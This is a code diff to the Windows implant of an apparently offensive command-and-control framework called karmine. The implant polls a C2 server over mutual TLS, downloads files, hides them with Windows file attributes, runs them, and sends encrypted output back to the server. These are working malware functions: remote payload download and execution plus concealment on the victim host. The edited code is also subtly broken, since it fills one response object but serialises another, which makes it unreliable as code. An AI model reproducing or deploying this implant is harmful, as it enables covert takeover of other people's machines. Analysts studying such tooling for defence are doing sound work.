@@ -1,3 +1,5 @@
+//go:build windows
+
 package main
 
 import (
@@ -9,9 +11,9 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
-	"runtime"
 	"strconv"
 	"sync"
+	"syscall"
 	"time"
 
 	"github.com/pygrum/karmine/client"
@@ -20,6 +22,7 @@ import (
 	"github.com/pygrum/karmine/krypto/kryptor"
 	"github.com/pygrum/karmine/models"
 	log "github.com/sirupsen/logrus"
+	_ "modernc.org/sqlite"
 )
 
 // set at compile time
@@ -41,10 +44,7 @@ func main() {
 	CmdMap[1] = ex.Do
 	var wg sync.WaitGroup
 	c2Endpoint := InitC2Endpoint
-	waitSecondsInt, err := strconv.Atoi(InitWaitSeconds)
-	if err != nil {
-		waitSecondsInt = 600 // default loop time until next command is 10 minutes
-	}
+	waitSecondsInt, _ := strconv.Atoi(InitWaitSeconds)
 	if _, err := os.Stat(InitPFile); err == nil {
 		HideF(InitPFile)
 	}
@@ -61,10 +61,11 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
-	wg.Add(1)
+	wg.Add(2)
 	go awaitCmd(string(endpointStr), string(UUID), X1, X2, InitAESKey, ticker, mTLSClient) // thread handling receiving commands
 
 	go awaitFile(string(endpointStr), string(UUID), X1, X2, InitAESKey, InitPFile, ticker, mTLSClient) // thread handling receiving files
+
 	wg.Wait()
 }
 
@@ -82,30 +83,30 @@ func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey, pFile string, ticker *time.Ti
 			if err = os.WriteFile(filename, fileObj.FileBytes, 0744); err != nil {
 				continue
 			}
-			if _, err := os.Stat(pFile); err != nil {
-				go handleFile(cmdID, filename, c2Endpoint, UUID, broadcast, kX1, kX2, aesKey, pFile, mTLSClient)
+			if broadcast {
+				go handleFile(cmdID, filename, c2Endpoint, UUID, kX1, kX2, aesKey, pFile, mTLSClient)
 			} else {
+				// Packer only handles encrypted files (fileObj.FileBytes is encrypted)
 				cmd := exec.Command(pFile, filename)
-				var cerr bytes.Buffer
+				var cout, cerr bytes.Buffer
 				cmd.Stderr = &cerr
+				cmd.Stdout = &cout
+				retObj := &models.KarResponseObjectFile{}
 				if err := cmd.Run(); err != nil {
-					fileObj := &models.KarResponseObjectFile{
-						Error:  1,
-						ErrVal: cerr.String(),
-					}
-					bytes, _ := json.Marshal(fileObj)
-					if !broadcast {
-						bytes, err = kes.EncryptObject(bytes, aesKey, kX1, kX2)
-						if err != nil {
-							continue
-						}
-					}
-					go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
-						CmdID:  cmdID,
-						Type:   2,
-						Object: bytes,
-					})
+					retObj.Error = 1
+					retObj.ErrVal = cerr.String()
 				}
+				retObj.RetVal = cout.String()
+				bytes, _ := json.Marshal(fileObj)
+				bytes, err = kes.EncryptObject(bytes, aesKey, kX1, kX2)
+				if err != nil {
+					continue
+				}
+				go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
+					CmdID:  cmdID,
+					Type:   2,
+					Object: bytes,
+				})
 			}
 		}
 	}
@@ -126,29 +127,21 @@ func awaitCmd(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mT
 	}
 }
 
-func handleFile(cmdID int, fname, c2Endpoint, UUID string, broadcast bool, kX1, kX2, aesKey, pFile string, mTLSClient *http.Client) {
+// This only runs if file was not encrypted
+func handleFile(cmdID int, fname, c2Endpoint, UUID string, kX1, kX2, aesKey, pFile string, mTLSClient *http.Client) {
 	HideF(fname)
-	if runtime.GOOS == "linux" {
-		fname = "./" + fname
-	}
 	cmd := exec.Command(fname)
 	fileObj := models.KarResponseObjectFile{}
-	var cerr bytes.Buffer
+	var cout, cerr bytes.Buffer
 	cmd.Stderr = &cerr
+	cmd.Stdout = &cout
+	retObj := &models.KarResponseObjectFile{}
 	if err := cmd.Run(); err != nil {
-		fmt.Println(err)
-		fmt.Println(cerr.String())
-		fileObj.Error = 1
-		fileObj.ErrVal = cerr.String()
+		retObj.Error = 1
+		retObj.ErrVal = cerr.String()
 	}
+	retObj.RetVal = cout.String()
 	bytes, _ := json.Marshal(fileObj)
-	var err error
-	if !broadcast {
-		bytes, err = kes.EncryptObject(bytes, aesKey, kX1, kX2)
-		if err != nil {
-			return
-		}
-	}
 	go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
 		CmdID:  cmdID,
 		Type:   2,
@@ -257,4 +250,16 @@ func postData(Endpoint, UUID string, mTLSClient *http.Client, data *models.Gener
 		log.Error(err)
 		return
 	}
+}
+
+func HideF(filename string) error {
+	filenameW, err := syscall.UTF16PtrFromString(filename)
+	if err != nil {
+		return err
+	}
+	err = syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_HIDDEN)
+	if err != nil {
+		return err
+	}
+	return nil
 }
